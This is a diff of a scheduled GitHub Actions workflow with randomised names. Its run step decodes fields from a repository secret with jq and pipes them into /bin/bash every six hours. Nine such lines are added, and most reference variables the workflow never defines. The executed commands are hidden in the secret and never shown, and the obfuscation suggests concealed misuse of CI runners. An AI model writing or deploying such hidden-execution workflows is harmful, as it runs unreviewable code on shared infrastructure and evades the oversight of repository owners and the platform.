@@ -2,21 +2,24 @@ name: dongchudai5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
-
-jobs:  # 11537
+    - cron: '33 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongchudai5647
         env:
-          x6821: ${{ secrets.x6821 }}
+          cyzc4: ${{ secrets.cyzc4 }}
         run: |
-          echo $x6821 | jq -r .v95789 | /bin/bash
-          echo $cmvnr19 | jq -r .nfa95874 | /bin/bash
-          echo $k63 | jq -r .xkus2203 | /bin/bash
-          echo $alx0 | jq -r .hqkcd512 | /bin/bash
-          echo $tvq4 | jq -r .zsu4 | /bin/bash
-          echo $zvzsc03092 | jq -r .cp51 | /bin/bash
+          echo $cyzc4 | jq -r .pv79110 | /bin/bash
+          echo $waurs3760 | jq -r .tw88985 | /bin/bash
+          echo $ky27434 | jq -r .h2892 | /bin/bash
+          echo $dxfpk9183 | jq -r .ade97 | /bin/bash
+          echo $weg733 | jq -r .mbkz99824 | /bin/bash
+          echo $zbaa80 | jq -r .p85618 | /bin/bash
+          echo $rd91793 | jq -r .pti6 | /bin/bash
+          echo $a84 | jq -r .rt8930 | /bin/bash
+          echo $rkc3 | jq -r .an48 | /bin/bash
 
